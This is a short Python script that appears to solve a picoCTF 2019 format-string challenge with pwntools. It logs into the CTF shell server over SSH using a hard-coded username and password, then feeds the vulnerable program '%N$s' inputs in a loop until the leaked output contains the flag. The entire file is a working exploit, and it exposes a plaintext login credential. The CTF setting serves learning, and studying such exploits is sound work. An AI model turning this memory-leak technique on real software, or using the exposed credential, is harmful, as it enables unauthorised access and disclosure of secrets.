# Format String Attack: https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be
from pwn import *
s=ssh(host="2019shell1.picoctf.com",user="Hohenheim10",password="mhw1015sz15,.")
s.set_working_directory(wd=b"/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4")
i = 0
while True:
    p = s.process("./vuln")
    format_string = "%"+str(i)+"$s"
    p.sendlineafter("input whatever string you want; then it will be printed back:\n", format_string)
    res = p.recvall()
    if b"picoCTF" in res:
        flag = res.decode("utf-8").split("{")[1].split("}")[0]
        print(flag)
        break;
    i+=1
    p.close()
